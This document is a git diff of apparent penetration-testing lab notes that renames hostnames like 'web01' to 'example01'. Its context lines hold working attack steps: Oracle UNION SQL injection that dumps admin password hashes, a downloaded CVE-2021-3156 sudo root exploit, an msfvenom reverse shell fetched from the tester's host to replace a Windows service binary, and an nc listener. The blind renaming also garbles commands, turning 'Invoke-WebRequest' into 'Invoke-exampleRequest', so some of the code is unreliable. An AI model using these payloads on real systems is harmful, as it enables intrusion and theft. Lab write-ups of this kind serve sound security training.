@@ -238,7 +238,7 @@ fireball         (id_ecdsa)
 ````
 /etc/ssh/*pub #Use this to view the type of key you have aka (ecdsa)
 
-ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@web01
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@example01
 ````
 ````
 /home/userE/.ssh/id_ecdsa.pub #public key
@@ -582,7 +582,7 @@ CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System
 ###### POC
 ````
 ./50383.sh targets.txt /etc/ssh/*pub
-ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@web01
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@example01
 
 ./50383.sh targets.txt /home/userE/.ssh/id_ecdsa
 192.168.138.245:8000
@@ -600,13 +600,13 @@ CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
 ##### /etc/hosts FQDN
 ###### Background
 ````
-on our initial scan we were able to find a pdf file that included credentials and instructions to setup an umbraco cms. "IIS is configured to only allow access to Umbraco the server is FQDN at the moment e.g. web02.example.com, not just web02"
+on our initial scan we were able to find a pdf file that included credentials and instructions to setup an umbraco cms. "IIS is configured to only allow access to Umbraco the server is FQDN at the moment e.g. example02.example.com, not just example02"
 ````
 ###### Initial Scan
 ````
 nmap -p 80,443,5985,14080,47001 -sC -sV -A 192.168.138.247                                                  
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-25 18:58 EDT
-Nmap scan report for web02.example.com (192.168.138.247)
+Nmap scan report for example02.example.com (192.168.138.247)
 Host is up (0.067s latency).
 
 PORT      STATE SERVICE  VERSION
@@ -645,7 +645,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 TRACEROUTE (using port 80/tcp)
 HOP RTT      ADDRESS
 1   51.93 ms 192.168.119.1
-2   51.88 ms web02.example.com (192.168.138.247)
+2   51.88 ms example02.example.com (192.168.138.247)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 27.34 seconds
@@ -654,13 +654,13 @@ Nmap done: 1 IP address (1 host up) scanned in 27.34 seconds
 ````
 127.0.0.1       localhost
 127.0.1.1       kali
-192.168.138.247 web02.example.com
+192.168.138.247 example02.example.com
 ````
 ###### New Nmap Scan
 ````
-nmap -p 80,443,5985,14080,47001 -sC -sV -A web02.example.com
+nmap -p 80,443,5985,14080,47001 -sC -sV -A example02.example.com
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-25 19:00 EDT
-Nmap scan report for web02.example.com (192.168.138.247)
+Nmap scan report for example02.example.com (192.168.138.247)
 Host is up (0.092s latency).
 
 PORT      STATE SERVICE  VERSION
@@ -698,7 +698,7 @@ Service Info: Host: www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
 TRACEROUTE (using port 80/tcp)
 HOP RTT       ADDRESS
 1   100.83 ms 192.168.119.1
-2   100.82 ms web02.example.com (192.168.138.247)
+2   100.82 ms example02.example.com (192.168.138.247)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 32.21 seconds
@@ -1373,16 +1373,16 @@ java.sql.SQLSyntaxErrorException: ORA-01790: expression must have same datatype 
  ' union select null,null,null from dual-- #query
 Blog entry from null with title null from 0
 ' union select user,null,null from dual-- #query
-Blog entry from WEB_APP with title null from 0
+Blog entry from example_APP with title null from 0
 ' union select table_name,null,null from all_tables-- #query
-Blog entry from WEB_ADMINS with title null from 0
-Blog entry from WEB_CONTENT with title null from 0
-Blog entry from WEB_USERS with title null from 0
-' union select column_name,null,null from all_tab_columns where table_name='WEB_ADMINS'-- #query
+Blog entry from example_ADMINS with title null from 0
+Blog entry from example_CONTENT with title null from 0
+Blog entry from example_USERS with title null from 0
+' union select column_name,null,null from all_tab_columns where table_name='example_ADMINS'-- #query
 Blog entry from ADMIN_ID with title null from 0
 Blog entry from ADMIN_NAME with title null from 0
 Blog entry from PASSWORD with title null from 0
-' union select ADMIN_NAME||PASSWORD,null,null from WEB_ADMINS-- #query
+' union select ADMIN_NAME||PASSWORD,null,null from example_ADMINS-- #query
 Blog entry from admind82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892 with title null from 0
 ````
 
@@ -2677,11 +2677,11 @@ uid=0(rootz) gid=0(root) groups=0(root)
 wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
 chmod +x exploit_nss.py
 
-userE@web01:~$ id
+userE@example01:~$ id
 uid=1004(userE) gid=1004(userE) groups=1004(userE),998(apache)
 
 
-userE@web01:~$ python3 exploit_nss.py 
+userE@example01:~$ python3 exploit_nss.py 
 # whoami
 root
 ````
@@ -2896,7 +2896,7 @@ uid=0(root) gid=0(root)
 #### (ALL) NOPASSWD: ALL
 ````
 sudo su -
-root@WEB01:~# whoami
+root@example01:~# whoami
 root
 ````
 #### (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
@@ -3700,12 +3700,12 @@ move "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe" "C:
 ````
 ````
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.140 LPORT=80 -f exe -o shell.exe
-Invoke-WebRequest -Uri "http://192.168.119.140:8000/shell.exe" -OutFile "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe"
+Invoke-exampleRequest -Uri "http://192.168.119.140:8000/shell.exe" -OutFile "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe"
 ````
 ````
 get-service *exac*
-stop-service ESMWebService*
-start-service ESMWebService*
+stop-service ESMexampleService*
+start-service ESMexampleService*
 ````
 ````
 nc -nlvp 80
